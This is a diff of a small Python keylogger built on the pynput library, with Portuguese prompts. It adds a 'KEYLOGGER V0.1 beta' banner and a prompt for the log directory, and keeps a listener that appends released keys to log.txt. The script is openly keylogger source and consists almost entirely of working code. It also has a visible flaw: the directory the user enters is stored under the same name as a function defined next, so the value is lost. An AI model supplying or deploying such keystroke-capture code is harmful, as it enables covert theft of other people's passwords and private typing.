@@ -1,6 +1,10 @@
 from pynput.keyboard import Listener, Key
-arq = '/home/cabriel/Documentos/python-scripts/keylogger/log.txt'
+print('\t#########\t')
+print('\tKEYLOGGER\n\tV0.1 beta')
+print('\t#########\t')
+print('>aperte esq para interromper<')
 
+log = input('Insira o diretório com o arquivo de log aqui: ')
 def log(texto):
     with open('log.txt', 'a') as fl: 
        for t in texto:  
@@ -19,5 +23,3 @@ def monitor(key):
 
 with Listener (on_release=monitor) as l:
     l.join()
-
-  
